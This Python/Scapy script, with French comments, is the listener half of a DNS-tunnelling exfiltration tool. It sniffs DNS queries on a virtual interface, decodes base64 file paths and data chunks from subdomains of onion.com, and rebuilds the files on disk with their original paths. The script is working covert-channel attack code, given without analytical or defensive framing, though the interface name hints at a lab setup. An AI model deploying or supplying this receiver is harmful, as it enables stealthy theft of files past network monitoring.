from scapy.all import *
import base64
import re
import sys
import os
from collections import OrderedDict

# Configuration
output_dir = "received_files"
interface = "vmnet8"
file_chunks = OrderedDict()  # {filename: [chunks]}
current_file = None

def process_dns_packet(pkt):
    global current_file
    if not pkt.haslayer(DNSQR):
        return
    
    try:
        qname = pkt[DNSQR].qname.decode('utf-8')
        
        # Nouveau format: base64(path/to/file.ext).data.onion.com
        file_match = re.match(r'^([A-Za-z0-9+/=]+)\.([A-Za-z0-9+/=]+)\.onion\.com\.?$', qname, re.IGNORECASE)
        end_match = re.match(r'^([A-Za-z0-9+/=]+)\.end\.onion\.com\.?$', qname, re.IGNORECASE)
        
        if end_match:
            encoded_filename = end_match.groups()[0]
            try:
                # Décoder le nom de fichier depuis base64
                decoded_filename = base64.b64decode(encoded_filename).decode('utf-8')
                print(f"End signal received for: {decoded_filename}")
                save_file(decoded_filename)
                current_file = None
            except Exception as e:
                print(f"Error decoding filename from base64: {str(e)}")
                
        elif file_match:
            encoded_filename, chunk_data = file_match.groups()
            try:
                # Décoder le nom de fichier depuis base64
                decoded_filename = base64.b64decode(encoded_filename).decode('utf-8')
                current_file = decoded_filename
                
                # Décoder les données du chunk
                decoded_chunk = base64.b64decode(chunk_data)
                
                if decoded_filename not in file_chunks:
                    file_chunks[decoded_filename] = []
                file_chunks[decoded_filename].append(decoded_chunk)
                
                print(f"Received chunk for {decoded_filename} ({len(decoded_chunk)} bytes) #{len(file_chunks[decoded_filename])}")
                
            except Exception as e:
                print(f"Error decoding data: {str(e)}")
                
    except Exception as e:
        print(f"Packet processing error: {str(e)}")

def save_file(filename):
    if filename in file_chunks and file_chunks[filename]:
        if os.path.isabs(filename):
            relative_path = filename.lstrip('/')
            output_path = os.path.join(output_dir, relative_path)
        else:
            output_path = os.path.join(output_dir, filename)
        
        output_directory = os.path.dirname(output_path)
        if output_directory:
            os.makedirs(output_directory, exist_ok=True)
        else:
            os.makedirs(output_dir, exist_ok=True)
        
        try:
            with open(output_path, 'wb') as f:
                for chunk in file_chunks[filename]:
                    f.write(chunk)
            print(f"File successfully saved: {output_path} (original: {filename})")
        except Exception as e:
            print(f"Error saving file {filename}: {e}")
        finally:
            del file_chunks[filename]

if __name__ == "__main__":
    print(f"Starting DNS receiver on {interface}")
    print(f"Output directory: {output_dir}")
    print("Waiting for files... (Ctrl+C to stop)")
    print("Expected format: base64(path/to/file.ext).data.onion.com")
    
    try:
        sniff(iface=interface,
              filter="udp port 53",
              prn=process_dns_packet,
              store=0)
    except KeyboardInterrupt:
        # Sauvegarde des fichiers incomplets à l'arrêt
        if current_file and current_file in file_chunks:
            save_file(current_file)
        print("\nReceiver stopped")
        
        # Sauvegarde finale de tous les fichiers restants
        for filename in list(file_chunks.keys()):
            save_file(filename)